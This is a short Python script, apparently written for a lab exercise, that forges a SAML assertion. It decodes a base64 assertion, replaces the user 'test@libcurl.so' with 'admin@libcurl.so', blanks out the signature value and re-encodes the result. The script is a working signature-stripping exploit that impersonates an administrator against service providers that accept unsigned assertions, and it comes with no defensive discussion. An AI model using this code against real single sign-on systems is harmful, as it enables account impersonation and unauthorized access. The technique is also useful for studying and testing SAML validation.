import base64
import re

old = 'a@a.com'
new = 'admin@libcurl.so'
encode = 'utf-8'

def decodeb64_as_str(assertion):
    """Decode a base64 string and maintain the type string.

    Parameters:
        assertion (str): SAML assertion response encoded in base64.

    Returns:
        string:Returning value.
    """
    deco = base64.b64decode(assertion)
    return deco.decode(encode)

def encodeb64_from_str(assertion):
    """Encode a string to base64.

    Parameters:
        assertion (str): SAML assertion in plain text.

    Returns:
        string:Returning value.
    """
    enco = base64.b64encode(bytes(assertion,encoding=encode))
    # Decode bytes data into utf-8 and then return.
    return enco.decode(encode)

def remove_signature_content(assertion):
    """Remove content of a SignatureValue.

    Parameters:
        assertion (str): SAML assertion in plain text.

    Returns:
        string:Returning value.
    """
    match = "<ds:SignatureValue>.*</ds:SignatureValue>"
    replace = "<ds:SignatureValue></ds:SignatureValue>"
    return re.sub(match, replace, assertion)

def replace_substring(assertion, old_sub, new_sub):
    """Replace a substring for a new one in assertion.

    Parameters:
        assertion (string): SAML assertion in plain text.
        old_sub (string): Substring to replace.
        new_sub (string): New substring to put.

    Returns:
        string:Returning value.
    """
    return re.sub(old_sub,new_sub, assertion)

# Get string of the encoded assertion.
assertion = input()
# Decode the assertion.
assertion = decodeb64_as_str(assertion)
# Tamper with `admin@libcurl.so`.
assertion = replace_substring(assertion,'test@libcurl.so','admin@libcurl.so')
# Remove content of the signature.
assertion = remove_signature_content(assertion)
# Encode to base64.
assertion = encodeb64_from_str(assertion)
print(assertion)

